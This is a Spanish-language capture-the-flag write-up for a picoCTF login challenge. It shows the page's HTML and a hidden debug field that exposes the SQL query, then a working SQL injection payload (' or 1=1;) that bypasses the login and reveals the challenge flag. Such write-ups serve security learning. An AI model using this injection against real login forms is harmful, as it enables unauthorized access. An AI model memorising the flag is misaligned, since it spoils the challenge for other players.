## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. 
Do you think you can log us in? Try to see if you can login!
## Solución
- ##### Se analiza el código fuente de la página, se observa que hay un form para usuario y password. Se cambia el valor de "hidden" a 1, para hacer que ya no esté oculto.
``` html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

- ##### Al tratar de iniciar sesión como "admin", no podemos iniciar, pero el valor "hidden" nos muestra la consulta que se hace a una base de datos, por lo que trataremos de realizar una inyección SQL para obtener la bandera.
```
CONSULTA SQL NORMAL
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

Login failed.

CONSULTA SQL INYECTADA
username: ' or 1=1;
password: inyeccion
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='inyeccion'

Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Notas Adicionales
- SQL injection is a code injection technique that might destroy your database, is one of the most common web hacking techniques and is the placement of malicious code in SQL statements, via web page input.
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)